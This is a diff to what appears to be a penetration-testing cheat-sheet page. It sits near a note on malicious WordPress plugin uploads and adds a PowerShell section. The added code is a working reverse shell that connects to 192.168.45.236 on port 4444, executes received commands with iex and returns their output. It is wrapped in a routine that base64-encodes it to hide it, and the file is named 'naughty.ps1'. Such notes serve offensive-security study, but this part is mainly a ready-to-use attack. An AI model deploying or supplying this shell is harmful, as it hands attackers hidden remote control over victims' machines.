@@ -48,6 +48,19 @@ Zip that PHP file, then upload the zipped file as a plugin.
 > This lovely [malicious WordPress plugin](https://github.com/wetw0rk/malicious-wordpress-plugin) generator works well on some versions of WordPress and not others.  The boring one above works a bit more uniformally, but is nowhere near as full of features.
 {: .prompt-info}
 
+### Powershell
+
+```powershell
+$Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.236",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+
+$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
+
+$EncodedText = [Convert]::ToBase64String($Bytes)
+
+$EncodedText
+```
+{: file='~/naughty.ps1'}
+
 ---
 
 ## Catching
